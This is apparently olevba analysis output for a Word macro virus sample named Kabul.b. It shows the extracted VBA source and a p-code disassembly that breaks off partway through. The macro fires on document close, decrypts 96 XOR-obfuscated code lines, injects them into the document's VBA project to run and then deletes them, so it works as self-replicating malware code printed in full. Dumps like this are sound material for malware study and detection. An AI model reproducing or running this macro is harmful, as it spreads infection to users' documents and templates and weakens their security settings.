olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kabul.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kabul.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Kabul.b - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Kabul 2
Private Sub FileClose()
Call Kabul
End Sub
Private Sub Document_Close()
Call Kabul
End Sub
Private Sub AutoClose()
Call Kabul
End Sub
Private Sub Kabul()
Dim ourcode(100) As String
On Error Resume Next
ourcode(1) = "ﾊ�･ﾀ�ﾗ璋爭ﾋ��""
ourcode(2) = "ﾖ瑰･��ｸ･ﾋ�蓚ﾑ琲蓴爿ﾓﾇﾕ�琥ﾓﾇﾆ�頷��琿ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ�矜ﾈ�碣鰲""
ourcode(3) = "ﾖ瑰･ｸ･ﾑ澈�跼鞨�ﾓﾇﾕ�琥ﾓﾇﾆ�頷��琿ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ�矜ﾈ�碣鰲""
ourcode(4) = "顰跛矜･ｸ･ﾉ��璋ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｶｵｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(5) = "ﾊ�･ﾆｭｧ羲ﾜ鮏�ﾜ褊ﾜ�矮ｮｩ･ｰｬ･ﾃ�ﾊﾄｦｴ"
ourcode(6) = "ﾕ�ｦｴｩ･ｧ��･璞鞨･��"
ourcode(7) = "ﾕ�ｦｴｩ･ﾆｭｧﾓ襁�矮ｽﾗﾓ胄鴪ﾃ磑袞粲裙ｧｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧﾗ�ｮﾁ�鱚磑鴆鈊ｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧｩｧｩ･ｰｬ"
ourcode(8) = "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾏ鴆ⅴｮﾖ鶯ﾐ胖鴆釞ｽｰｧｩ･ｰｬ"
ourcode(9) = "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾏ鴆ⅴｮﾓ磋衾�碆ﾐ瀇ｽｰｧｩ･ｰｬ"
ourcode(10) = "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾏ鴆ⅴｮﾃ�鮻鶯朎�ⅷ褪�ⅴｽｰｧｩ･ｰｬ"
ourcode(11) = "ﾕ�ｦｴｩ･ﾆｭｧﾆ�ｽｱﾔ��矮ｮﾎ�碆ﾔ褊磑螳ﾖﾂﾐ�裙ﾖﾂﾃ�瀇�鮱ⅵﾉ愷ｱｩｮﾃ�蒟ﾍ�蔟�螳ﾃ�賣鴃褫ｧｩ･ｰｬ"
ourcode(12) = "ﾕ�ｦｴｩ･ﾆｭｧﾋ矮ｮﾎ�碆ﾔ褊磑螳ﾖﾂﾐ�裙ﾖﾂﾃ�瀇�鮱ⅵﾉ愷ｱｩｮﾃ�蒟ﾍ�蔟�螳ﾄ褌襁衫鴃褫ｱｧｩ･ｰｬ"
ourcode(13) = "ﾕ�ｦｴｩ･ﾆｭｧﾎ褸ｩ･ｰｬ"
ourcode(14) = "ﾕ�ｦｴｩ･ﾆｭｧﾋ矮ｮﾎ�碆ﾔ褊磑螳ﾖﾂﾐ�裙ﾖﾂﾃ�瀇�鮱ⅵﾉ愷ｱｩｮﾃ�蒟ﾍ�蔟�螳ﾁ蒿ﾆ枻鴈蝣ｨｧｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧﾃｺﾜ鮏�ﾜ褊ﾜ�矮ｮﾂﾁﾓｧｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧｩｧｩ･ｰｬ"
ourcode(15) = "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾁ�鱚磑鴆鈹ﾑｩ･ｰｬ"
ourcode(16) = "ﾆ鳰･ｦｴ"
ourcode(17) = "ﾊ�･ﾆｭｧ羲ﾜﾗ鴃蔡ﾜ褊ﾜ�矮ｮ粃ｩ･ｰｬ･ﾃ�ﾊﾄｦｴ"
ourcode(18) = "ﾕ�ｦｴｩ･顰跛矜"
ourcode(19) = "ﾆ鳰･ｦｴ"
ourcode(20) = "ﾖ�琲ｫﾕﾕ冐鰲ﾖ��箝ｧｧｩ･ﾆｭｧﾈﾋﾅﾙﾟﾌﾏﾃﾁﾌﾟﾍﾁﾃﾈﾉﾎﾅﾜﾓ�踝ﾜﾍ鱚踝ﾜﾗ鴃蔡ﾜﾃⅵﾖ褪�餧ﾒｧｩ･ｰｬｩ･ﾆｭｧﾋ矮ｧｩ･ｰｬｬ･ｸ･ﾆｭｧﾃｺﾜﾗ鴃蔡ﾜ褊ﾜ�矮ｮﾖﾂﾓｧｩ･ｰｬ"
ourcode(21) = "ﾖ�琲ｫﾕﾕ冐鰲ﾖ��箝ｧｧｩ･ﾆｭｧﾈﾋﾅﾙﾟﾃﾕﾒﾒﾅﾎﾔﾟﾕﾓﾅﾒﾜﾓ�踝ﾜﾍ鱚踝ﾜﾏ跏鱚袰ｹｮｰﾜﾗ�ﾜﾓ裙鴟ｩ･ｰｬｩ･ﾆｭｧﾌ褻褌ｧｩ･ｰｬｬ･ｸ･ｴ｣"
ourcode(22) = "ﾒ�･ﾊ����"
ourcode(23) = "ｫﾓ�踈���･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(24) = "ｫﾆ��冐ﾆ�����ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(25) = "ｫﾖ蔘猴�蓚ﾕ頷ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(26) = "ｫﾄ鴈趾��ｫﾖ踟珥�ﾐ蓴��筵ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(27) = "ｫﾄ鴈趾��ｫﾀ�蓍鰲ﾆ蓁赳鯰珱･ｸ･ﾆ蓁赳鮹�鉉珮""
ourcode(28) = "ｫﾄ鴈趾��ｫﾖ渼�蓚ﾇ蔕�貘碆ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(29) = "ｫﾄ鴈趾��ｫﾁ�鱠�ﾄ鰲ｸ･ﾄ鰲���""
ourcode(30) = "ｫﾄ鴈趾��ｫﾁ�鱠�ﾖ蔔･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(31) = "ﾀ�皈ﾒ�""
ourcode(32) = "ﾆ�韋蓁睇蔔ﾆｭｧﾔ���ｩ･ｰｬｬｫﾆ���鴕ｭﾆｭｧﾍ矼ｧｩ･ｰｬｬｫﾀ�蓍鰲皈ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(33) = "��蓚鱠��｡･ｸ･ﾆｭｧ羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘ｩ･ｰｬ"
ourcode(34) = "ﾖ蔘狷��蓚鱠��｡"
ourcode(35) = "ﾃ��･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾑ�･ﾁ�跼鞨�ｫﾆ��"
ourcode(36) = "ﾒ�･ﾁ�跼鞨�ｭ�ｬｫﾓﾇﾕ�琥ﾓﾇﾆ�頷��琿ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ�矜ﾈ�碣鰲""
ourcode(37) = "ｫﾁ琺瑰猖��璋･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ｫﾆ�翹��璋"
ourcode(38) = "ｫ蓊矼頽��筵顰跛矜"
ourcode(39) = "ﾀ�皈ﾒ�""
ourcode(40) = "ﾋ��""
ourcode(41) = "ﾒ�･���""
ourcode(42) = "ｫﾁ琺瑰猖��璋･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ｫﾆ�翹��璋"
ourcode(43) = "ｫ蓊矼頽��筵顰跛矜"
ourcode(44) = "ﾀ�皈ﾒ�""
ourcode(45) = "ﾋ�蓚ﾑ琲蓴爿ﾖ蔘�""
ourcode(46) = "ﾕ蓴犱･ｸ･ﾆｭｧﾃｺﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌ｮ鴃鬧ｩ･ｰｬ"
ourcode(47) = "ﾊ�･ﾕ蓴犱･ﾃ�ﾊﾄｦｴ"
ourcode(48) = "ﾁ�隘�ｭｷｲｬ･ﾄﾖ���""
ourcode(49) = "�ｭｵｬ･ｸ･ｧﾛﾓﾃﾒﾉﾐﾔﾝｧ"
ourcode(50) = "�ｭｴｬ･ｸ･ｧ銧ｽﾏﾎｱｺﾊﾏﾉﾎｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲ｩ﨡鞦�ｧ"
ourcode(51) = "�ｭｷｬ･ｸ･ｧ鉷ｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(52) = "�ｭｶｬ･ｸ･ｧ鉸ｽｧ"
ourcode(53) = "�ｭｱｬ･ｸ･ｧ鋧ｽﾏﾎｱｺﾐﾁﾒﾔｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲ｩ﨡鞦�ｧ"
ourcode(54) = "�ｭｰｬ･ｸ･ｧ鋗ｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(55) = "�ｭｳｬ･ｸ･ｧ鋙ｽｧ"
ourcode(56) = "�ｭｲｬ･ｸ･ｧ鋐ｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ糢ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
ourcode(57) = "�ｭｽｬ･ｸ･ｧ﨧ｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(58) = "�ｭｼｬ･ｸ･ｧ鋕ｽｧ"
ourcode(59) = "�ｭｴｵｬ･ｸ･ｧ鋠ｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ硼皙ｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
ourcode(60) = "�ｭｴｴｬ･ｸ･ｧ鉷ｰｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(61) = "�ｭｴｷｬ･ｸ･ｧ鉷ｱｽｧ"
ourcode(62) = "�ｭｴｶｬ･ｸ･ｧ鉷ｲｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ�砌褓ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
ourcode(63) = "�ｭｴｱｬ･ｸ･ｧ鉷ｳｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(64) = "�ｭｴｰｬ･ｸ･ｧ鉷ｴｽｧ"
ourcode(65) = "�ｭｴｳｬ･ｸ･ｧ鉷ｵｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ罨ｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
ourcode(66) = "�ｭｴｲｬ･ｸ･ｧ鉷ｶｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(67) = "�ｭｴｽｬ･ｸ･ｧ鉷ｷｽｧ"
ourcode(68) = "�ｭｴｼｬ･ｸ･ｧ鉷ｸｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ￢ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
ourcode(69) = "�ｭｷｵｬ･ｸ･ｧ鉷ｹｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(70) = "�ｭｷｴｬ･ｸ･ｧ鉸ｰｽｧ"
ourcode(71) = "�ｭｷｷｬ･ｸ･ｧ鉸ｱｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ鈑�蟐ｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
ourcode(72) = "�ｭｷｶｬ･ｸ･ｧ鉸ｲｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(73) = "�ｭｷｱｬ･ｸ･ｧ鉸ｳｽｧ"
ourcode(74) = "�ｭｷｰｬ･ｸ･ｧ鉸ｴｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ礦釿鵫碚ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
ourcode(75) = "�ｭｷｳｬ･ｸ･ｧ鉸ｵｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
ourcode(76) = "�ｭｷｲｬ･ｸ･ｧ鉸ｶｽｧ"
ourcode(77) = "ﾃ��･ｸ･ｵ･ﾑ�･ｷｲ"
ourcode(78) = "ﾕ�ｦｴｩ･ﾆｭ�ｭ�ｬｩ･ｰｬ"
ourcode(79) = "ﾋ��""
ourcode(80) = "ﾆ鳰･ｦｴ"
ourcode(81) = "ﾁ�隘矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｱｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾄﾖ���""
ourcode(82) = "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ渧ﾜ褊ﾜｮ鴃鬧ｩ･ｰｬ"
ourcode(83) = "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｷｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ渧ｳｲﾜ褊ﾜｮ鴃鬧ｩ･ｰｬ"
ourcode(84) = "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｶｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ�銓�ｱﾜ渧ﾜｮ鴃鬧ｩ･ｰｬ"
ourcode(85) = "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｱｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ�銓�ｱﾜ渧ｳｲﾜｮ鴃鬧ｩ･ｰｬ"
ourcode(86) = "ﾃ��･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾑ�･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｱｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(87) = "ﾖ瑰ﾄ矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭ�ｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ﾋ�蓚""
ourcode(88) = "ﾖ浯鳬･ﾆｭｧ胥ｧｩ･ｰｬ･｣･ﾕ蓴犱･｣･ﾆｭｧｧｩ･ｰｬ･｣･矜ｭ�ｬ"
ourcode(89) = "ﾋ��""
ourcode(90) = "ﾌ罕ﾁ蕈ｭﾋ�ｬｬ･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾄ�皈ﾈ��ｭﾋ�ｬｬ･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｼｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾑ浯�""
ourcode(91) = "ﾒ�･ﾁ�跼鞨�ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ����"
ourcode(92) = "ｫﾃ��ﾋ蒻爭ｸ･ﾆｭｧﾗ鴃鈕鴃銛ｧｩ･ｰｬ"
ourcode(93) = "ｫﾃ��ﾖ�爭ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｲｷｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
ourcode(94) = "ｫﾌ�ﾄ胝璞･ﾆｭｧﾑｳｳﾎﾙｧｩ･ｰｬ"
ourcode(95) = "ﾀ�皈ﾒ�""
ourcode(96) = "ﾀ�皈ﾌ�""
For i = 96 To 1 Step -1
ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 126, Crypt(ourcode(i), 133)
Next
run
For i = i To Documents.Count
Documents(i).VBProject.VBComponents(1).CodeModule.DeleteLines 126, 96
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 126, 96
Next
End Sub
Private Function Crypt(q33ny, key)
For i = 1 To Len(q33ny)
Crypt = Crypt & Chr(Asc(Mid(q33ny, i, 1)) Xor key)
Next
q33ny = ""
End Function
Private Sub run()

End Sub











































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Kabul.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 924 bytes
' Macros/VBA/ThisDocument1 - 13660 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0007 "Kabul 2"
' Line #1:
' 	FuncDefn (Private Sub FileClose())
' Line #2:
' 	ArgsCall (Call) Kabul 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' 	ArgsCall (Call) Kabul 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub AutoClose())
' Line #8:
' 	ArgsCall (Call) Kabul 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub Kabul())
' Line #11:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0064 
' 	VarDefn ourcode (As String)
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitStr 0x0015 "ﾊ�･ﾀ�ﾗ璋爭ﾋ��""
' 	LitDI2 0x0001 
' 	ArgsSt ourcode 0x0001 
' Line #14:
' 	LitStr 0x0066 "ﾖ瑰･��ｸ･ﾋ�蓚ﾑ琲蓴爿ﾓﾇﾕ�琥ﾓﾇﾆ�頷��琿ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ�矜ﾈ�碣鰲""
' 	LitDI2 0x0002 
' 	ArgsSt ourcode 0x0001 
' Line #15:
' 	LitStr 0x0064 "ﾖ瑰･ｸ･ﾑ澈�跼鞨�ﾓﾇﾕ�琥ﾓﾇﾆ�頷��琿ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ�矜ﾈ�碣鰲""
' 	LitDI2 0x0003 
' 	ArgsSt ourcode 0x0001 
' Line #16:
' 	LitStr 0x006A "顰跛矜･ｸ･ﾉ��璋ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｶｵｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x0004 
' 	ArgsSt ourcode 0x0001 
' Line #17:
' 	LitStr 0x003D "ﾊ�･ﾆｭｧ羲ﾜ鮏�ﾜ褊ﾜ�矮ｮｩ･ｰｬ･ﾃ�ﾊﾄｦｴ"
' 	LitDI2 0x0005 
' 	ArgsSt ourcode 0x0001 
' Line #18:
' 	LitStr 0x0020 "ﾕ�ｦｴｩ･ｧ��･璞鞨･��"
' 	LitDI2 0x0006 
' 	ArgsSt ourcode 0x0001 
' Line #19:
' 	LitStr 0x007A "ﾕ�ｦｴｩ･ﾆｭｧﾓ襁�矮ｽﾗﾓ胄鴪ﾃ磑袞粲裙ｧｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧﾗ�ｮﾁ�鱚磑鴆鈊ｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧｩｧｩ･ｰｬ"
' 	LitDI2 0x0007 
' 	ArgsSt ourcode 0x0001 
' Line #20:
' 	LitStr 0x0037 "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾏ鴆ⅴｮﾖ鶯ﾐ胖鴆釞ｽｰｧｩ･ｰｬ"
' 	LitDI2 0x0008 
' 	ArgsSt ourcode 0x0001 
' Line #21:
' 	LitStr 0x0038 "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾏ鴆ⅴｮﾓ磋衾�碆ﾐ瀇ｽｰｧｩ･ｰｬ"
' 	LitDI2 0x0009 
' 	ArgsSt ourcode 0x0001 
' Line #22:
' 	LitStr 0x003A "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾏ鴆ⅴｮﾃ�鮻鶯朎�ⅷ褪�ⅴｽｰｧｩ･ｰｬ"
' 	LitDI2 0x000A 
' 	ArgsSt ourcode 0x0001 
' Line #23:
' 	LitStr 0x006E "ﾕ�ｦｴｩ･ﾆｭｧﾆ�ｽｱﾔ��矮ｮﾎ�碆ﾔ褊磑螳ﾖﾂﾐ�裙ﾖﾂﾃ�瀇�鮱ⅵﾉ愷ｱｩｮﾃ�蒟ﾍ�蔟�螳ﾃ�賣鴃褫ｧｩ･ｰｬ"
' 	LitDI2 0x000B 
' 	ArgsSt ourcode 0x0001 
' Line #24:
' 	LitStr 0x0062 "ﾕ�ｦｴｩ･ﾆｭｧﾋ矮ｮﾎ�碆ﾔ褊磑螳ﾖﾂﾐ�裙ﾖﾂﾃ�瀇�鮱ⅵﾉ愷ｱｩｮﾃ�蒟ﾍ�蔟�螳ﾄ褌襁衫鴃褫ｱｧｩ･ｰｬ"
' 	LitDI2 0x000C 
' 	ArgsSt ourcode 0x0001 
' Line #25:
' 	LitStr 0x001A "ﾕ�ｦｴｩ･ﾆｭｧﾎ褸ｩ･ｰｬ"
' 	LitDI2 0x000D 
' 	ArgsSt ourcode 0x0001 
' Line #26:
' 	LitStr 0x00B0 "ﾕ�ｦｴｩ･ﾆｭｧﾋ矮ｮﾎ�碆ﾔ褊磑螳ﾖﾂﾐ�裙ﾖﾂﾃ�瀇�鮱ⅵﾉ愷ｱｩｮﾃ�蒟ﾍ�蔟�螳ﾁ蒿ﾆ枻鴈蝣ｨｧｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧﾃｺﾜ鮏�ﾜ褊ﾜ�矮ｮﾂﾁﾓｧｩ･ｰｬ･｣･ﾆ煆ｭｶｱｬ･｣･ﾆｭｧｩｧｩ･ｰｬ"
' 	LitDI2 0x000E 
' 	ArgsSt ourcode 0x0001 
' Line #27:
' 	LitStr 0x002C "ﾕ�ｦｴｩ･ﾆｭｧ�矮ｮﾁ�鱚磑鴆鈹ﾑｩ･ｰｬ"
' 	LitDI2 0x000F 
' 	ArgsSt ourcode 0x0001 
' Line #28:
' 	LitStr 0x0008 "ﾆ鳰･ｦｴ"
' 	LitDI2 0x0010 
' 	ArgsSt ourcode 0x0001 
' Line #29:
' 	LitStr 0x003D "ﾊ�･ﾆｭｧ羲ﾜﾗ鴃蔡ﾜ褊ﾜ�矮ｮ粃ｩ･ｰｬ･ﾃ�ﾊﾄｦｴ"
' 	LitDI2 0x0011 
' 	ArgsSt ourcode 0x0001 
' Line #30:
' 	LitStr 0x0010 "ﾕ�ｦｴｩ･顰跛矜"
' 	LitDI2 0x0012 
' 	ArgsSt ourcode 0x0001 
' Line #31:
' 	LitStr 0x0008 "ﾆ鳰･ｦｴ"
' 	LitDI2 0x0013 
' 	ArgsSt ourcode 0x0001 
' Line #32:
' 	LitStr 0x00AA "ﾖ�琲ｫﾕﾕ冐鰲ﾖ��箝ｧｧｩ･ﾆｭｧﾈﾋﾅﾙﾟﾌﾏﾃﾁﾌﾟﾍﾁﾃﾈﾉﾎﾅﾜﾓ�踝ﾜﾍ鱚踝ﾜﾗ鴃蔡ﾜﾃⅵﾖ褪�餧ﾒｧｩ･ｰｬｩ･ﾆｭｧﾋ矮ｧｩ･ｰｬｬ･ｸ･ﾆｭｧﾃｺﾜﾗ鴃蔡ﾜ褊ﾜ�矮ｮﾖﾂﾓｧｩ･ｰｬ"
' 	LitDI2 0x0014 
' 	ArgsSt ourcode 0x0001 
' Line #33:
' 	LitStr 0x0082 "ﾖ�琲ｫﾕﾕ冐鰲ﾖ��箝ｧｧｩ･ﾆｭｧﾈﾋﾅﾙﾟﾃﾕﾒﾒﾅﾎﾔﾟﾕﾓﾅﾒﾜﾓ�踝ﾜﾍ鱚踝ﾜﾏ跏鱚袰ｹｮｰﾜﾗ�ﾜﾓ裙鴟ｩ･ｰｬｩ･ﾆｭｧﾌ褻褌ｧｩ･ｰｬｬ･ｸ･ｴ｣"
' 	LitDI2 0x0015 
' 	ArgsSt ourcode 0x0001 
' Line #34:
' 	LitStr 0x000C "ﾒ�･ﾊ����"
' 	LitDI2 0x0016 
' 	ArgsSt ourcode 0x0001 
' Line #35:
' 	LitStr 0x003C "ｫﾓ�踈���･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x0017 
' 	ArgsSt ourcode 0x0001 
' Line #36:
' 	LitStr 0x003F "ｫﾆ��冐ﾆ�����ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x0018 
' 	ArgsSt ourcode 0x0001 
' Line #37:
' 	LitStr 0x003D "ｫﾖ蔘猴�蓚ﾕ頷ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x0019 
' 	ArgsSt ourcode 0x0001 
' Line #38:
' 	LitStr 0x0047 "ｫﾄ鴈趾��ｫﾖ踟珥�ﾐ蓴��筵ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x001A 
' 	ArgsSt ourcode 0x0001 
' Line #39:
